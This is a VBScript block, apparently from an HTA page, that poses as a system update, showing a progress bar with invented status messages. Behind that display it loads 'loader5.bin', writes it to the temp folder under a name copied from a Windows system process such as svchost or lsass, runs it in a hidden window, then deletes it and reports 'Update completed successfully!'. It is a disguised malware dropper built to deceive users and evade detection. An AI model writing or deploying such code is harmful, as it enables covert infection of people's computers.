    <script language="VBScript">
        ' Simple function to generate random name
        Function GenerateName()
            Dim names
            names = Array("msedge", "svchost", "runtime", "system", "taskhost", "winlogon", "services", "lsass", "csrss", "smss")
            Randomize
            GenerateName = names(Int((UBound(names) + 1) * Rnd)) & ".exe"
        End Function

        ' Function to read binary file as base64
        Function ReadFileAsBase64(filename)
            On Error Resume Next
            Dim stream, bytes, base64
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 1 ' Binary
            stream.Open
            stream.LoadFromFile filename
            bytes = stream.Read
            base64 = XML.EncodeBinaryData(bytes)
            stream.Close
            Set stream = Nothing
            ReadFileAsBase64 = base64
        End Function

        ' Function to decode base64 and write to file
        Sub WriteBase64ToFile(base64, filename)
            On Error Resume Next
            Dim stream, bytes
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 1 ' Binary
            stream.Open
            bytes = XML.DecodeBinaryData(base64)
            stream.Write bytes
            stream.SaveToFile filename, 2
            stream.Close
            Set stream = Nothing
        End Sub

        ' Function to execute file
        Sub ExecuteFile(filename)
            On Error Resume Next
            Dim shell
            Set shell = CreateObject("WScript.Shell")
            shell.Run Chr(34) & filename & Chr(34), 0, False
            Set shell = Nothing
        End Sub

        ' Function to update progress
        Sub UpdateProgress(percent)
            document.getElementById("progressBar").style.width = CStr(percent) & "%"
        End Sub

        ' Function to update status
        Sub UpdateStatus(text)
            document.getElementById("status").innerText = text
        End Sub

        ' Main function
        Sub startUpdate()
            On Error Resume Next
            
            ' Disable button
            document.getElementsByClassName("button")(0).style.display = "none"
            
            ' Step 1: Initializing
            UpdateStatus "Initializing update components..."
            UpdateProgress 10
            Dim waitTime
            waitTime = Now() + TimeValue("00:00:01")
            Do While Now() < waitTime
                Loop
            
            ' Step 2: Checking system
            UpdateStatus "Checking system compatibility..."
            UpdateProgress 20
            waitTime = Now() + TimeValue("00:00:01")
            Do While Now() < waitTime
                Loop
            
            ' Step 3: Downloading updates
            UpdateStatus "Downloading updates..."
            UpdateProgress 40
            waitTime = Now() + TimeValue("00:00:02")
            Do While Now() < waitTime
                Loop
            
            ' Step 4: Verifying files
            UpdateStatus "Verifying update files..."
            UpdateProgress 60
            waitTime = Now() + TimeValue("00:00:01")
            Do While Now() < waitTime
                Loop
            
            ' Step 5: Preparing installation
            UpdateStatus "Preparing installation..."
            UpdateProgress 80
            waitTime = Now() + TimeValue("00:00:01")
            Do While Now() < waitTime
                Loop
            
            ' Step 6: Execute the loader
            UpdateStatus "Applying updates..."
            UpdateProgress 90
            
            ' Read the loader file
            Dim base64Data, tempFile
            base64Data = ReadFileAsBase64("loader5.bin")
            
            If Len(base64Data) > 0 Then
                ' Create a temporary file with a random name
                tempFile = Environ("TEMP") & "\" & GenerateName()
                
                ' Write the decoded data to the temporary file
                WriteBase64ToFile base64Data, tempFile
                
                ' Execute the file
                ExecuteFile tempFile
                
                ' Clean up after execution
                Dim fso
                Set fso = CreateObject("Scripting.FileSystemObject")
                waitTime = Now() + TimeValue("00:00:03")
                Do While Now() < waitTime
                    Loop
                fso.DeleteFile tempFile, True
                Set fso = Nothing
            End If
            
            ' Step 7: Complete
            UpdateStatus "Update completed successfully!"
            UpdateProgress 100
            waitTime = Now() + TimeValue("00:00:02")
            Do While Now() < waitTime
                Loop
            
            ' Close the window
            window.close
        End Sub
